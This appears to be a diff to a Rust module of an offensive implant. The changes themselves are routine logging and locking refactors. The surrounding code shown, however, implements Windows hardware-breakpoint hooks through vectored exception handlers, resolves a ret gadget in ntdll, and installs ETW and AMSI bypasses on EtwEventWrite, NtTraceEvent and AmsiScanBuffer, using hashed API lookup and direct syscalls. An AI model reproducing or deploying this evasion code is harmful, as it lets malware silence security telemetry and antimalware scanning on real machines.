@@ -37,6 +37,7 @@
 //! install VEH handlers.  Must only be called on Windows x86_64.
 
 #[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
+use common::lock::MutexExt;
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 
 #[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
@@ -425,7 +426,7 @@ unsafe fn ensure_veh() -> bool {
     let add_veh = match resolve_add_veh() {
         Some(f) => f,
         None => {
-            log::error!("hw_bp_hook: failed to resolve AddVectoredExceptionHandler");
+            tracing::error!("hw_bp_hook: failed to resolve AddVectoredExceptionHandler");
             return false;
         }
     };
@@ -438,7 +439,7 @@ unsafe fn ensure_veh() -> bool {
     );
 
     if handle.is_null() {
-        log::error!("hw_bp_hook: AddVectoredExceptionHandler returned NULL");
+        tracing::error!("hw_bp_hook: AddVectoredExceptionHandler returned NULL");
         return false;
     }
 
@@ -446,7 +447,7 @@ unsafe fn ensure_veh() -> bool {
 
     // Store the VEH handle in the state for later removal.
     {
-        let mut state = STATE.lock().unwrap();
+        let mut state = STATE.lock_recover();
         match &mut *state {
             Some(s) => s.veh_handle = handle as usize,
             None => {
@@ -458,7 +459,7 @@ unsafe fn ensure_veh() -> bool {
         }
     }
 
-    log::debug!("hw_bp_hook: VEH handler registered at {:#x}", veh_handler as *const () as usize);
+    tracing::debug!("hw_bp_hook: VEH handler registered at {:#x}", veh_handler as *const () as usize);
     true
 }
 
@@ -476,7 +477,7 @@ unsafe fn program_debug_regs_for_thread(
     ctx.context_flags = CONTEXT_DEBUG_REGISTERS;
 
     if nt_get_ctx(thread_handle, &mut ctx) < 0 {
-        log::warn!("hw_bp_hook: NtGetContextThread failed");
+        tracing::warn!("hw_bp_hook: NtGetContextThread failed");
         return false;
     }
 
@@ -518,7 +519,7 @@ unsafe fn program_debug_regs_for_thread(
     }
 
     if nt_set_ctx(thread_handle, &mut ctx) < 0 {
-        log::warn!("hw_bp_hook: NtSetContextThread failed");
+        tracing::warn!("hw_bp_hook: NtSetContextThread failed");
         return false;
     }
 
@@ -677,7 +678,7 @@ pub unsafe fn install_hw_bp(
 
     // Register the hook in the state.
     {
-        let mut state = STATE.lock().unwrap();
+        let mut state = STATE.lock_recover();
         if let Some(s) = &mut *state {
             s.slots[slot] = Some(HookEntry {
                 target_addr,
@@ -701,14 +702,14 @@ pub unsafe fn install_hw_bp(
         SLOT_ADDRESSES[slot].store(0, Ordering::Release);
         SLOT_CALLBACKS[slot].store(0, Ordering::Release);
         SLOT_INSN_SIZES[slot].store(0, Ordering::Release);
-        let mut state = STATE.lock().unwrap();
+        let mut state = STATE.lock_recover();
         if let Some(s) = &mut *state {
             s.slots[slot] = None;
         }
         return Err("failed to program debug registers for current thread");
     }
 
-    log::debug!(
+    tracing::debug!(
         "hw_bp_hook: installed execute breakpoint at {:#x} in Dr{} (insn_size={})",
         target_addr,
         slot,
@@ -758,7 +759,7 @@ pub unsafe fn remove_hw_bp(target_addr: usize) -> Result<(), &'static str> {
 
     // Clear the state entry.
     {
-        let mut state = STATE.lock().unwrap();
+        let mut state = STATE.lock_recover();
         if let Some(s) = &mut *state {
             s.slots[slot] = None;
         }
@@ -776,10 +777,10 @@ pub unsafe fn remove_hw_bp(target_addr: usize) -> Result<(), &'static str> {
 
     let current_thread = -2isize as usize;
     if !program_debug_regs_for_thread(current_thread, nt_get_ctx, nt_set_ctx) {
-        log::warn!("hw_bp_hook: failed to reprogram debug regs after removal");
+        tracing::warn!("hw_bp_hook: failed to reprogram debug regs after removal");
     }
 
-    log::debug!(
+    tracing::debug!(
         "hw_bp_hook: removed breakpoint from Dr{} (addr={:#x})",
         slot,
         target_addr,
@@ -834,7 +835,7 @@ pub unsafe fn install_for_all_threads() -> bool {
     // Check if any hooks are active.
     let any_active = (0..MAX_HW_BP_SLOTS).any(|s| SLOT_ADDRESSES[s].load(Ordering::Relaxed) != 0);
     if !any_active {
-        log::debug!("hw_bp_hook: install_for_all_threads: no active hooks");
+        tracing::debug!("hw_bp_hook: install_for_all_threads: no active hooks");
         return true;
     }
 
@@ -868,7 +869,7 @@ pub unsafe fn install_for_all_threads() -> bool {
     // TH32CS_SNAPTHREAD = 0x4
     let snapshot = create_snap(0x4, 0);
     if snapshot == usize::MAX || snapshot == 0 {
-        log::warn!("hw_bp_hook: CreateToolhelp32Snapshot failed");
+        tracing::warn!("hw_bp_hook: CreateToolhelp32Snapshot failed");
         return false;
     }
 
@@ -915,7 +916,7 @@ pub unsafe fn install_for_all_threads() -> bool {
 
                 // Program debug registers.
                 if !program_debug_regs_for_thread(handle, nt_get_ctx, nt_set_ctx) {
-                    log::warn!(
+                    tracing::warn!(
                         "hw_bp_hook: failed to program debug regs for tid {}",
                         entry.thread_id
                     );
@@ -939,7 +940,7 @@ pub unsafe fn install_for_all_threads() -> bool {
 
     let _ = crate::syscall!("NtClose", snapshot as u64);
 
-    log::debug!(
+    tracing::debug!(
         "hw_bp_hook: programmed debug registers for {} threads",
         thread_count,
     );
@@ -969,7 +970,7 @@ pub unsafe fn cleanup() {
 
     // Clear the state.
     let veh_handle = {
-        let mut state = STATE.lock().unwrap();
+        let mut state = STATE.lock_recover();
         match &mut *state {
             Some(s) => {
                 s.slots = [None, None, None, None];
@@ -995,7 +996,7 @@ pub unsafe fn cleanup() {
         VEH_REGISTERED.store(false, Ordering::Release);
     }
 
-    log::debug!("hw_bp_hook: cleanup complete");
+    tracing::debug!("hw_bp_hook: cleanup complete");
 }
 
 #[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
@@ -1153,7 +1154,7 @@ unsafe fn resolve_ret_gadget() -> bool {
         for i in 0..32usize {
             if *ptr.add(i) == 0xC3 {
                 ETW_RET_GADGET.store(nt_close + i, Ordering::Release);
-                log::debug!("hw_bp_hook: ret gadget resolved at {:#x}", nt_close + i);
+                tracing::debug!("hw_bp_hook: ret gadget resolved at {:#x}", nt_close + i);
                 return true;
             }
         }
@@ -1170,13 +1171,13 @@ unsafe fn resolve_ret_gadget() -> bool {
         for i in 0..16usize {
             if *ptr.add(i) == 0xC3 {
                 ETW_RET_GADGET.store(peb_fn + i, Ordering::Release);
-                log::debug!("hw_bp_hook: ret gadget (fallback) at {:#x}", peb_fn + i);
+                tracing::debug!("hw_bp_hook: ret gadget (fallback) at {:#x}", peb_fn + i);
                 return true;
             }
         }
     }
 
-    log::warn!("hw_bp_hook: failed to resolve ret gadget from ntdll");
+    tracing::warn!("hw_bp_hook: failed to resolve ret gadget from ntdll");
     false
 }
 
@@ -1199,7 +1200,7 @@ pub unsafe fn install_etw_bypass() -> bool {
     // Resolve the ret gadget first.
     if ETW_RET_GADGET.load(Ordering::Relaxed) == 0 {
         if !resolve_ret_gadget() {
-            log::warn!("hw_bp_hook: cannot install ETW bypass — no ret gadget");
+            tracing::warn!("hw_bp_hook: cannot install ETW bypass — no ret gadget");
             return false;
         }
     }
@@ -1220,9 +1221,9 @@ pub unsafe fn install_etw_bypass() -> bool {
         match install_hw_bp(addr, etw_bypass_callback, 0) {
             Ok(_) => {
                 installed = true;
-                log::debug!("hw_bp_hook: ETW bypass installed on EtwEventWrite at {:#x}", addr);
+                tracing::debug!("hw_bp_hook: ETW bypass installed on EtwEventWrite at {:#x}", addr);
             }
-            Err(e) => log::warn!("hw_bp_hook: failed to hook EtwEventWrite: {}", e),
+            Err(e) => tracing::warn!("hw_bp_hook: failed to hook EtwEventWrite: {}", e),
         }
     }
 
@@ -1231,9 +1232,9 @@ pub unsafe fn install_etw_bypass() -> bool {
         match install_hw_bp(addr, etw_bypass_callback, 0) {
             Ok(_) => {
                 installed = true;
-                log::debug!("hw_bp_hook: ETW bypass installed on NtTraceEvent at {:#x}", addr);
+                tracing::debug!("hw_bp_hook: ETW bypass installed on NtTraceEvent at {:#x}", addr);
             }
-            Err(e) => log::debug!("hw_bp_hook: NtTraceEvent hook skipped: {}", e),
+            Err(e) => tracing::debug!("hw_bp_hook: NtTraceEvent hook skipped: {}", e),
         }
     }
 
@@ -1267,7 +1268,7 @@ pub unsafe fn install_amsi_bypass() -> bool {
     // Resolve the ret gadget first.
     if ETW_RET_GADGET.load(Ordering::Relaxed) == 0 {
         if !resolve_ret_gadget() {
-            log::warn!("hw_bp_hook: cannot install AMSI bypass — no ret gadget");
+            tracing::warn!("hw_bp_hook: cannot install AMSI bypass — no ret gadget");
             return false;
         }
     }
@@ -1276,7 +1277,7 @@ pub unsafe fn install_amsi_bypass() -> bool {
     let hmod = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
         Some(b) => b,
         None => {
-            log::debug!("hw_bp_hook: amsi.dll not loaded — AMSI bypass not needed");
+            tracing::debug!("hw_bp_hook: amsi.dll not loaded — AMSI bypass not needed");
             return true; // Not an error — AMSI isn't active.
         }
     };
@@ -1285,19 +1286,19 @@ pub unsafe fn install_amsi_bypass() -> bool {
     let scan_buf_addr = match pe_resolve::get_proc_address_by_hash(hmod, scan_buf_hash) {
         Some(a) => a,
         None => {
-            log::warn!("hw_bp_hook: AmsiScanBuffer not found in amsi.dll");
+            tracing::warn!("hw_bp_hook: AmsiScanBuffer not found in amsi.dll");
             return false;
         }
     };
 
     match install_hw_bp(scan_buf_addr, amsi_bypass_callback, 0) {
         Ok(_) => {
-            log::debug!("hw_bp_hook: AMSI bypass installed on AmsiScanBuffer at {:#x}", scan_buf_addr);
+            tracing::debug!("hw_bp_hook: AMSI bypass installed on AmsiScanBuffer at {:#x}", scan_buf_addr);
             install_for_all_threads();
             true
         }
         Err(e) => {
-            log::warn!("hw_bp_hook: failed to hook AmsiScanBuffer: {}", e);
+            tracing::warn!("hw_bp_hook: failed to hook AmsiScanBuffer: {}", e);
             false
         }
     }
@@ -1354,13 +1355,12 @@ mod tests {
         /// A simple test target function.
         /// The `volatile` prevents the compiler from optimizing it away.
         #[no_mangle]
-        #[naked]
+        #[unsafe(naked)]
         unsafe extern "system" fn test_target() -> u32 {
-            std::arch::asm!(
+            std::arch::naked_asm!(
                 "xor eax, eax",
                 "inc eax",
                 "ret",
-                options(noreturn)
             );
         }
 
@@ -1387,7 +1387,7 @@ mod tests {
 
             if result.is_err() {
                 // May fail if no debug register slots available (e.g., under debugger).
-                log::warn!("test_install_and_fire_hw_bp: install failed: {:?}", result);
+                tracing::warn!("test_install_and_fire_hw_bp: install failed: {:?}", result);
                 return;
             }
 
